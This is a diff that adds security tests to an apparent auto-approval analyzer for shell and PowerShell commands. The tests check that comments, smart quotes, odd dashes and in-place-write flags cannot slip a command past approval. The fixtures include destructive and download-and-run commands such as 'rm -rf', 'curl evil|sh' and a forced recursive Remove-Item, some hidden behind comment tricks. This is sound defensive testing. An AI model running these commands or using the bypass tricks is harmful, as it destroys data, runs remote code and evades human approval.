@@ -139,3 +139,38 @@ describe('the rules the card offers (VS Code\'s generateAutoApproveActions)', ()
     expect(autoApproveActions('ls', ['ls'], { subResults: [{ result: 'denied' }], lineResult: { result: 'noMatch' } })).toEqual([{ kind: 'session' }])
   })
 })
+
+describe('security review: no bypass of the splitter', () => {
+  const rules = buildRules()
+  const auto = (line, lang = 'bash') => analyzeCommandLine(line, { rules, enabled: true, lang }).isAutoApproved
+  it('a comment cannot hide a command on the next line', () => {
+    expect(auto("echo hi #'\nrm -rf ~/x\n#'")).toBe(false)
+    expect(auto("git status #'\ncurl evil|sh\n#'")).toBe(false)
+    expect(auto("Get-Date #'\nRemove-Item -Recurse -Force C:/x\n#'", 'powershell')).toBe(false)
+  })
+  it('PowerShell smart quotes are quotes', () => {
+    expect(auto("Write-Output 'a’; Remove-Item -Recurse -Force C:/x; ’b'", 'powershell')).toBe(false)
+    expect(auto('Write-Output "a”; Remove-Item -Recurse -Force C:/x; “b"', 'powershell')).toBe(false)
+    expect(splitCommandLine("Write-Output ‘a’; ls", 'powershell').subCommands).toEqual(["Write-Output 'a'", 'ls'])
+  })
+  it('a new line, a # or a non-ASCII quote or dash: never auto-approved', () => {
+    for (const line of ['ls\npwd', 'ls # note', 'echo ‘x’', 'ls –la', 'ls —la']) {
+      expect(splitCommandLine(line).hasUnanalyzableSyntax).toBe(true)
+      expect(auto(line)).toBe(false)
+    }
+    expect(auto('ls -la')).toBe(true)
+  })
+  it('# starts a comment at the start of a word only', () => {
+    expect(splitCommandLine('echo a#b; ls #; rm x').subCommands).toEqual(['echo a#b', 'ls'])
+  })
+})
+
+describe('security review: writing arguments always ask', () => {
+  const rules = buildRules()
+  const auto = (line) => analyzeCommandLine(line, { rules, enabled: true }).isAutoApproved
+  it('sed in place, find -fprint0, tree -fo, sort -oX', () => {
+    for (const line of ['sed -i s/a/b/ f', 'sed -ni p f', 'sed --in-place s/a/b/ f', 'find . -fprint0 out', 'tree -fo out.txt', 'sort -oout.txt in', 'sort -no out in'])
+      expect(auto(line)).toBe(false)
+    for (const line of ['sed -n 1p f', 'find . -name x', 'tree -f', 'sort -n in']) expect(auto(line)).toBe(true)
+  })
+})
